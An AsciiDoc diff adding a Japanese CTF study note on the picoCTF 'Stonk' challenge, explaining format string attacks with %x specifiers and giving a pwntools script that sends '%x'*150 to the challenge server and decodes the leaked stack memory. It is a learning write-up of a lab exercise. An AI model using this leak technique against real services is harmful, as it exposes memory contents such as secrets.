@@ -1,0 +1,52 @@
+:doctype: book
+:toc:
+:toc-title: 目次
+// :sectnums:
+:chapter-label:
+:source-highlighter: coderay
+:icons: font
+:stem:
+:author: Cassin01
+:tag: {CTF, note}
+
+
+Tag: {tag}
+
+= pecoCTFのメモ
+
+解答というよりはpecoCTFを通じて学んだことのメモ.
+
+== Stonk
+
+=== format string attack
+
+`printf(buf)` に `%08x`, `%x` 等を埋め込む
+
+- `%08x`: 8桁の16進数を出力
+- `%x`: 整数を16進数で出力
+
+link:++https://tech.kusuwada.com/entry/2021/04/08/121247++[解答]
+
+[source,python]
+----
+from pwn import *
+import binascii
+
+host = 'mercury.picoctf.net'
+port = 59616
+
+attack_msg = b'%x' * 150
+r = remote(host, port)
+r.recvuntil(b'2) View my portfolio\n')
+r.sendline(b'1')
+r.recvuntil(b'What is your API token?\n')
+r.sendline(attack_msg)
+res = r.recvuntil(b'Portfolio as of')[30:200]
+encoded = binascii.unhexlify(res)
+for i in range(len(encoded)//4):
+    for c in encoded[i*4:i*4+4][::-1]:
+        try:
+            print(chr(c), end='')
+        except:
+            continue
+----
